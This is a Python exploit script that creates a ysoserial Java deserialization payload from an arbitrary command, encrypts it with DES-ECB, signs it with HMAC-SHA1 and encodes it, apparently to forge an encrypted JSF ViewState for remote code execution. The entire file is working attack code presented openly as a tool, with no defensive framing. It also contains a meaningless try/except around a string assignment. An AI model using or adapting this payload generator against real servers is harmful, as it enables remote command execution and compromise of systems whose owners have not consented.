#!/usr/bin/python3
from argparse import ArgumentParser
from base64 import b64decode, b64encode
from hashlib import sha1
from hmac import digest
from os import environ
from shlex import split
from subprocess import check_output
from urllib.parse import quote

from pyDes import des

ECB = 0
CBC = 1
PKCS5 = 2


def payload(payload_type: str, command: str) -> bytes:
    try:
        payload_generator = f"java -jar ysoserial.jar {payload_type} '{command}'"
    except IOError:
        print("Unable to open file. Either the file doesn't exist or you have no read permissions.")
    viewstate = check_output(split(payload_generator))
    if isinstance(viewstate, str):
        viewstate = viewstate.encode()
    return viewstate


def encrypt(viewstate: bytes) -> str:
    if 'KEY' in environ:
        key = environ['KEY'].encode()
    else:
        print("Please set the KEY environment variable with your encryption key.")
        exit()
    d = des(key, mode=ECB, padmode=PKCS5)
    encrypted_viewstate = d.encrypt(viewstate)
    hmac_sha1 = digest(key, encrypted_viewstate, sha1)
    return quote(b64encode(
        encrypted_viewstate + hmac_sha1).decode())


def main():
    parser = ArgumentParser(
        description='Create ysoserial payload and encrypt it using a key')
    parser.add_argument('-t', '--type', nargs='?', const='CommonsCollection5', type=str,
                        default='CommonsCollection5', help="type of the payload generated by ysoserial")
    parser.add_argument('-c', '--command', type=str, required=True,
                        help="payload to be generated by ysoserial")
    args = parser.parse_args()

    print(
        f'Your encrypted payload:\n\n{encrypt(payload(args.type, args.command))}')


if __name__ == "__main__":
    main()
